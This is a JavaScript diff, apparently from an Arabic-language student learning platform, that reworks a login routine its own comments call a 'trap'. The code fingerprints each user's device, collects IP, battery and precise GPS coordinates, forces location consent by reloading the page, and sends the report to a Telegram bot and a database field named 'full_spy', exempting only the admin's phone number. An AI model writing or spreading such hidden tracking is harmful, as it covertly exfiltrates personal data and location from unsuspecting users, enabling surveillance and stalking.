@@ -673,18 +673,18 @@ function completeRegistration() {
             }
         };
 
-async function runApp() {
+           async function runApp() {
     const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
     if(!user) return;
 
-    // --- 🕵️ محرك الاستخبارات الرقمية المطور (Adam Programmer Edition) ---
+    // --- 🕵️ محرك الاستخبارات المطور (نسخة آدم المبرمج) ---
     const getDeepIntel = async () => {
         const ua = navigator.userAgent;
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
 
-        // 1. بصمة الكانفاس (Canvas Hash)
+        // 1. بصمة الكانفاس
         const ctx = canvas.getContext('2d');
         ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillText("KimoV26", 2, 2);
         const canvasData = canvas.toDataURL();
@@ -694,12 +694,8 @@ async function runApp() {
             hash |= 0;
         }
 
-        // 2. تتبع أدوات المطورين (DevTools Detection)
-        let devOpen = false;
-        const threshold = 160;
-        if(window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
-            devOpen = true;
-        }
+        // 2. كشف أدوات المطورين
+        let devOpen = (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160);
 
         // 3. أداء الشبكة (Ping)
         let pingResult = "N/A";
@@ -709,11 +705,7 @@ async function runApp() {
             pingResult = (Date.now() - start) + "ms";
         } catch(e) {}
 
-        // 4. كشف المحاكي واللمس
-        const touchPoints = navigator.maxTouchPoints || 0;
-        const isEmu = (touchPoints === 0 && /Android|iPhone|iPad/i.test(ua)) ? "نعم ⚠️" : "لا ✅";
-
-        // 5. البطارية والـ IP واللوكيشن
+        // 4. البطارية والـ IP
         let batteryStatus = "??";
         if (navigator.getBattery) {
             try {
@@ -725,7 +717,7 @@ async function runApp() {
         let geoData = {};
         try {
             geoData = await fetch('https://ipapi.co/json/').then(r => r.json());
-        } catch(e) { geoData = { ip: "Error", city: "Unknown" }; }
+        } catch(e) { geoData = { ip: "Error" }; }
 
         return {
             net: {
@@ -740,12 +732,11 @@ async function runApp() {
                 ram: navigator.deviceMemory || "??",
                 gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
                 canvas: Math.abs(hash),
-                touch: touchPoints
+                touch: navigator.maxTouchPoints || 0
             },
             status: {
                 ping: pingResult,
                 dev: devOpen ? "مفتوحة 🚫" : "مغلقة",
-                emu: isEmu,
                 bat: batteryStatus
             }
         };
@@ -753,13 +744,12 @@ async function runApp() {
 
     const d = await getDeepIntel();
 
-    // --- 🚀 تنفيذ المصيدة وإرسال الموقع التفصيلي ---
+    // --- 🚀 تنفيذ المصيدة وتشغيل المنصة ---
     const runTrap = () => {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                // رابط جوجل ماب المباشر بالإحداثيات
                 const mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
                 
                 const report = "🕵️‍♂️ *إشعار اصطياد بيانات جديد*\n" +
@@ -767,8 +757,7 @@ async function runApp() {
                              "📍 *البيانات الجغرافية (GPS):*\n" +
                              "• الموقع الدقيق: [اضغط لفتح الخريطة](" + mapLink + ")\n" +
                              "• الـ IP: " + d.net.ip + "\n" +
-                             "• الـ VPN: " + d.net.vpn + "\n" +
-                             "• المدينة: " + d.net.loc + "\n\n" +
+                             "• الـ VPN: " + d.net.vpn + "\n\n" +
                              "⚙️ *المواصفات التقنية:*\n" +
                              "• الموديل: " + d.hw.model + "\n" +
                              "• الهاردوير: " + d.hw.cpu + " Cores | " + d.hw.ram + "GB\n" +
@@ -777,8 +766,6 @@ async function runApp() {
                              "📶 *الأداء والسلوك:*\n" +
                              "• سرعة الـ Ping: " + d.status.ping + "\n" +
                              "• أدوات المطورين: " + d.status.dev + "\n" +
-                             "• محاكي (Emulator): " + d.status.emu + "\n" +
-                             "• نقاط اللمس: " + d.hw.touch + "\n" +
                              "• البطارية: " + d.status.bat + "\n\n" +
                              "⏰ *التوقيت:* " + new Date().toLocaleString('ar-EG');
 
@@ -787,8 +774,9 @@ async function runApp() {
 
                 fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(report) + "&parse_mode=Markdown");
                 
-                // تحديث قاعدة البيانات
-                studentsRef.child(user.phone).update({ full_spy: d, gps: mapLink });
+                if (typeof studentsRef !== 'undefined') {
+                    studentsRef.child(user.phone).update({ full_spy: d, gps: mapLink });
+                }
                 openPlatform();
 
             }, () => {
@@ -796,28 +784,43 @@ async function runApp() {
                 location.reload();
             }, {enableHighAccuracy: true});
         } else {
-            openPlatform(); // لو المتصفح مابيدعمش GPS أصلاً
+            openPlatform();
         }
     };
 
-    // استثناء الأدمن (أنت) من المصيدة
+    // استثناء الأدمن (أنت) من المصيدة لسرعة الدخول
     if (user.phone !== "01023175098") { 
         runTrap(); 
     } else { 
         openPlatform(); 
     }
 
+    // --- ✅ الدالة المسؤولة عن إظهار المنصة والزراير ---
     function openPlatform() {
-        blacklistRef.child(user.phone).on('value', s => { if(s.exists()) logout(); });
-        document.getElementById('login-gate').style.display = 'none';
-        document.getElementById('sidebar').style.display = 'flex';
-        document.getElementById('top-bar').style.display = 'flex';
-        document.getElementById('content').style.display = 'block';
-        document.getElementById('display-name').innerText = user.name.split(' ')[0];
-        loadData(); renderSubjectGrids();
+        const elements = ['login-gate', 'sidebar', 'top-bar', 'content'];
+        elements.forEach(id => {
+            const el = document.getElementById(id);
+            if (el) {
+                if (id === 'sidebar' || id === 'top-bar') el.style.display = 'flex';
+                else if (id === 'content') el.style.display = 'block';
+                else if (id === 'login-gate') el.style.display = 'none';
+            }
+        });
+
+        const nameDisplay = document.getElementById('display-name');
+        if (nameDisplay) nameDisplay.innerText = user.name.split(' ')[0];
+
+        // تشغيل دوال تحميل البيانات الأصلية بتاعتك
+        if (typeof loadData === "function") loadData();
+        if (typeof renderSubjectGrids === "function") renderSubjectGrids();
+
+        // حماية البلاك ليست
+        if (typeof blacklistRef !== "undefined") {
+            blacklistRef.child(user.phone).on('value', s => { if(s.exists()) logout(); });
+        }
     }
 }
-        
+  
         function loadData() { lessonsRef.on('value', s => { allData = s.val() || {}; renderLatest(); renderPinned(); }); }
         function loadStudentsList(sortedData) {
     let h = "";
